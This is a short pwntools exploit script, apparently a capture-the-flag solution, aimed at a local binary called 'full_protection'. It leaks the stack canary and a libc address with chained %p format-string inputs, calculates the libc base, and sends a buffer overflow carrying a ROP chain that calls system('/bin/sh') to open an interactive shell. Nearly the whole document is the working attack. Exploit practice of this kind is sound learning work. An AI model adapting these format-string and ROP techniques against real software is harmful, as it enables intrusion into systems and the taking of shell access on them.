#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./full_protection', env = {'LD_PRELOAD' : './libc-2.27.so'})
libc = ELF('./libc-2.27.so')

r.sendline('%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.{%p}.%p.%p')
r.recvuntil('{')
canary = int(r.recvuntil('}')[:-1],16)
print '[*] canary : ',hex(canary)

r.sendline('%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.{%p}')
r.recvuntil('{')
libc_base = int(r.recvuntil('}')[:-1],16) - 0x21b97
print '[*] libc_base : ',hex(libc_base)

pop_rdi_ret = libc_base + 0x2155f
ret = libc_base + 0x8aa

# strings -tx libc-2.27.so | grep -i '/bin/sh'
binsh = libc_base + 0x1b3e9a
system = libc_base + libc.symbols['system']

rop = flat(
    canary, 0xdeadbeef, ret, pop_rdi_ret, binsh, system    
)

raw_input('#')
r.sendline('\x00'*0x48 + rop)


r.interactive()
